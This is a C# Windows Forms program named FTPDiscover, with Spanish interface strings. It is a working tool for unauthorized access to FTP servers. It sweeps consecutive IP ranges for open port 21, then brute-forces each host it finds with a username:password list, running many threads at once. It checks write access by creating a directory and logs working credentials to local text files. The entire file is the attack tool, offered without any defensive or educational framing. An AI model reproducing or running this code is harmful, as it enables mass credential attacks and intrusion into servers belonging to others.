using System;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using Microsoft.VisualBasic;
using System.Diagnostics;

namespace FTPDiscover
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }
        int Escaneadas = 0;
        bool breake = true;
        string ipinicial = "";
        int ltime = 0;
        int pmir = 0;
        int Checkeadas = 0;
        int correctas = 0;
        int encontradas = 0;
        int FTPNo = 0;
        int IPPassban = 0;
        int FTPSiperoerror = 0;
        int ErrorDesconocido = 0;


        public void ipftptester(string ip)
        {
            if (breake == true)
            {
                return;
            }
            TcpClient tcpClient = new TcpClient();
            tcpClient.ConnectAsync(ip, 21);

            int tu = 0;
            while (tu < 2000)
            {
                if (breake == true)
                {
                    break;
                }
                tu++;
                if (tcpClient.Connected == true)
                {
                    escribeen(textBox2.Text, ip + ":21");
                    tu = 0;
                    encontradas += 1;
                    tcpClient = null;
                    break;
                }
                Thread.Sleep(1);
            }
        }
        private void timer1_Tick(object sender, EventArgs e)
        {
            label13.Text = "IPs Encontradas: " + encontradas;
            label8.Text = "Correctos: "+correctas;
            label9.Text = "FTPNo: " + FTPNo;
            label10.Text = "IPPassban: " + IPPassban;
            label11.Text = "FTPSiPeroError: " + FTPSiperoerror;
            label12.Text = "ErrorDesconocido: " + ErrorDesconocido;
            label2.Text= "Hilos: "+Process.GetCurrentProcess().Threads.Count.ToString();
            if (button1.Text=="Parar")
            {
                button4.Enabled = false;
            }
            else
            {
                button4.Enabled = true;
            }
            if (button4.Text == "Parar")
            {
                button1.Enabled = false;
            }
            else
            {
                button1.Enabled = true;
            }
            label1.Text = "IPs Escaneadas: "+Escaneadas.ToString()+" - "+pmir.ToString()+"/min";
            label3.Text="Checkeadas: "+Checkeadas;
        }
        private string rstr(int leng)
        {
            var chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var stringChars = new char[leng];
            var random = new Random();

            for (int i = 0; i < stringChars.Length; i++)
            {
                stringChars[i] = chars[random.Next(chars.Length)];
            }

            return new String(stringChars);
        }
        public string processopenips(string ip, string usr, string pss, bool ssll)
        {
            if (breake == true)
            {
                return "0";
            }
            StringBuilder result = new StringBuilder();

            FtpWebRequest requestDir;
            try
            {
                requestDir = (FtpWebRequest)WebRequest.Create("ftp://" + ip + ":21/"+ ((Int32)(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1))).TotalSeconds).ToString()+ rstr(5));
                requestDir.ReadWriteTimeout = 2000;
                requestDir.Timeout = 2000;
                requestDir.Method = WebRequestMethods.Ftp.MakeDirectory;
                requestDir.Credentials = new NetworkCredential(usr, pss);
                requestDir.EnableSsl = ssll;
                FtpWebResponse responseDir;
                responseDir = (FtpWebResponse)requestDir.GetResponse();

                if(Strings.Left(responseDir.StatusDescription.ToString(), 3)=="257")
                {
                    correctas += 1;
                    escribeen("C:\\Correctos.txt", ip + " User: " + usr + " Pass: " + pss + " Crear carpeta OK");
                    return "yep";
                }
                else
                {

                    escribeen("C:\\CorrectoDesconocido.txt", ip + " User: " + usr + " Pass: " + pss + " " + responseDir.StatusDescription.ToString() + "  -  " + responseDir.StatusCode.ToString());
                }
                
                
                Checkeadas++;
                return "0";
            }
            catch (Exception e)
            {

                if (e.Message.ToString().Contains("530"))
                {
                    FTPSiperoerror += 1;
                    escribeen("C:\\FTPSiPeroError.txt", ip + " User: " + usr + " Pass: " + pss + " Contraseña incorrecta");
                }
                else if (e.Message.ToString().Contains("550"))
                {
                    FTPSiperoerror += 1;
                    escribeen("C:\\FTPSiPeroError.txt", ip + " User: " + usr + " Pass: " + pss + " Crear carpeta FAIL");
                }
                else if (e.Message.ToString().Contains("Se excedió el tiempo de espera") || e.Message.ToString().Contains("No es posible conectar con el"))
                {
                    FTPNo += 1;
                    escribeen("C:\\FTPNo.txt", ip + " User: " + usr + " Pass: " + pss + " Timeout");
                    return "ftno";
                }
                else if (e.Message.ToString().Contains("Error del sistema"))
                {
                    IPPassban += 1;
                    escribeen("C:\\IPPassban.txt", ip + " User: " + usr + " Pass: " + pss + " Error del sistema");
                    return "ban";
                }
                else if (e.Message.ToString().Contains("534")|| e.Message.ToString().Contains("504"))
                {
                    FTPSiperoerror += 1;
                    escribeen("C:\\FTPSiPeroError.txt", ip + " User: " + usr + " Pass: " + pss + " Necesita SSL");
                }
                else if (e.Message.ToString().Contains("El número debe ser no negativo y menor que o igual a"))
                {
                    FTPNo += 1;
                    escribeen("C:\\FTPNo.txt", ip + " User: " + usr + " Pass: " + pss + " Error numero negativo?");
                    return "ftno";
                }
                else if (e.Message.ToString().Contains("Se ha terminado la conexión: El servidor ha cometido una infracción"))
                {
                    FTPNo += 1;
                    escribeen("C:\\FTPNo.txt", ip + " User: " + usr + " Pass: " + pss + " Error Infracion del servidor?");
                    return "ftno";
                }
                else if (e.Message.ToString().Contains("(500)"))
                {
                    FTPNo += 1;
                    
                    escribeen("C:\\FTPNo.txt", ip + " User: " + usr + " Pass: " + pss + " Error comando desconocido");
                    return "ftno";
                }
                else if (e.Message.ToString().Contains("421"))
                {
                    FTPSiperoerror += 1;
                    escribeen("C:\\FTPSiPeroError.txt", ip + " User: " + usr + " Pass: " + pss + " Conexion interrumpida(421)");
                }
                else if (e.Message.ToString().Contains("(200)"))
                {
                    FTPSiperoerror += 1;
                    escribeen("C:\\FTPSiPeroError.txt", ip + " User: " + usr + " Pass: " + pss + " Quote password?");
                }
                else
                {
                    ErrorDesconocido += 1;
                    escribeen("C:\\ErrorDesconocido.txt", ip +" Error:"+ e.Message.ToString());
                }
                Checkeadas++;
                return "0";
            }

        }
        private void escribeen(string file,string data)
        {
            if (!File.Exists(file))
            {
                try
                {
                    File.Create(file);
                }
                catch
                {
                }
            }
            Thread.Sleep(100);
            try
            {
                using (StreamWriter w = File.AppendText(file))
                {
                    w.WriteLine(data);
                }
            }
            catch
            {
                Thread.Sleep(150);
                escribeen(file, data);
            }
        }
        
        private void timer2_Tick(object sender, EventArgs e)
        {
            pmir = Escaneadas - ltime;
            ltime = Escaneadas;
        }
        


        private void scan_Click(object sender, EventArgs e)
        {
            
            if (button1.Text=="Parar")
            {
                breake = true;
                button1.Text = "Escanear";
            }
            else
            {
                encontradas = 0;
                button1.Text = "Parar";
                ipinicial = textBox1.Text;
                breake = false;
                File.Delete(textBox2.Text);
                try
                {
                    Escaneadas = 0;
                    Thread fwe3 = new Thread(() =>
                    {
                        int n1 = Convert.ToInt32(Strings.Split(ipinicial, ".")[0]);
                        int n2 = Convert.ToInt32(Strings.Split(ipinicial, ".")[1]);
                        int n3 = Convert.ToInt32(Strings.Split(ipinicial, ".")[2]);
                        int n4 = Convert.ToInt32(Strings.Split(ipinicial, ".")[3]);


                        while (true)
                        {
                            if (breake == true)
                            {
                                break;
                            }
                            Thread fwe = new Thread(() =>
                            {
                                try
                                {
                                    int k1 = n1;
                                    int k2 = n2;
                                    int k3 = n3;
                                    int k4 = n4;
                                    ipftptester(k1.ToString() + "." + k2.ToString() + "." + k3.ToString() + "." + k4.ToString());
                                }
                                catch { }
                                Thread.CurrentThread.Abort();
                            });
                            fwe.IsBackground = true;
                            fwe.Start();
                            Escaneadas += 1;
                            n4++;
                            if (n4 == 254)
                            {
                                n4 = 1;
                                n3++;
                                if (n3 == 254)
                                {
                                    n3 = 1;
                                    n2++;
                                }
                            }
                        }
                    });
                    fwe3.IsBackground = true;
                    fwe3.Start();
                }
                catch { }
            }
            
        }

        
        private void check_Click(object sender, EventArgs e)
        {

            if (button4.Text == "Parar")
            {
                breake = true;
                button4.Text = "Checkear";
            }
            else
            {
                
                correctas = 0;
                FTPNo = 0;
                IPPassban = 0;
                FTPSiperoerror = 0;
                ErrorDesconocido = 0;
                button4.Text = "Parar";
                Checkeadas = 0;
                breake = false;
                string[] ipsfile;
                    string[] pswfile;
                try
                {
                    ipsfile = File.ReadAllLines(textBox2.Text);
                    pswfile = File.ReadAllLines(textBox3.Text);

                }
                catch
                {
                    MessageBox.Show(textBox2.Text + " o " + textBox3.Text + " no existen o no tengo acceso o estan vacios", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                label4.Text = "A check: " + ipsfile.Length * pswfile.Length;
                Thread fwe3 = new Thread(() =>
                {

                    foreach (string ip in ipsfile)
                    {
                        if (breake == true)
                        {
                            break;
                        }
                    pico:
                        if (Process.GetCurrentProcess().Threads.Count > 1000)
                        {
                            goto pico;
                        }
                        Thread fwe = new Thread(() =>
                        {
                            foreach (string k in pswfile)
                            {
                                if (breake == true)
                                {
                                    break;
                                }
                                Thread.Sleep(2000);
                                string tux = processopenips(Strings.Split(ip, ":")[0], Strings.Split(k, ":")[0], Strings.Split(k, ":")[1], false);
                                if (tux == "yep" || tux == "ban" || tux == "ftno")
                                {
                                    goto end;
                                }
                            }
                        end:
                            Thread.CurrentThread.Abort();
                        });
                        fwe.IsBackground = true;
                        fwe.Start();


                    }

                });
                fwe3.IsBackground = true;
                fwe3.Start();
            }
        }

    }
}
